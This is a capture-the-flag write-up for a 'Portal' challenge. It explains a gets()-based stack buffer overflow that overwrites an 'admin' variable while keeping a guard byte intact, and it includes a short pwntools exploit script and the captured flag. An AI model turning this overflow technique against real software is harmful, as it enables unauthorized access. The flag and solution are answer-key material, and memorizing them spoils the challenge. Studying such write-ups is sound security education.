### Portal
![Question](https://github.com/alexbravo17/SecEduCTF2024Writeup/blob/main/Week1/images/portalq.png)

Given chal.c

`gets()` means this is probably a buffer overflow
However, there is simple protection used in this case, cannot go overboard on overflowing

The approach is pretty nooby, since I forgot how to do buffer overflow
printf the protect and admin values, try lengths of input until the values change
Then, retain value of protect and change admin

Offset is 10, next byte should be `\0`, then `A` then any byte other than 0
Make sure the 10 filler is not A, since chal.c checks for that
I used username but password may also work, for this I sent nothing to password

created simple pwntools program pwned.py

```
from pwn import *

offset = 10
host = "chals.secedu.site"
port = 5000

elf = ELF("./chal")
# p = elf.process()
p = remote(host, port)

payload = b'B' * offset + b'\0' + b'A' + b'1'

log.info(p.recv())
p.sendline(payload)
log.info(p.recv())
p.sendline(b'')
log.success(p.recv())
```

Got flag **SECEDU{por74l_to_n0wh3r3}**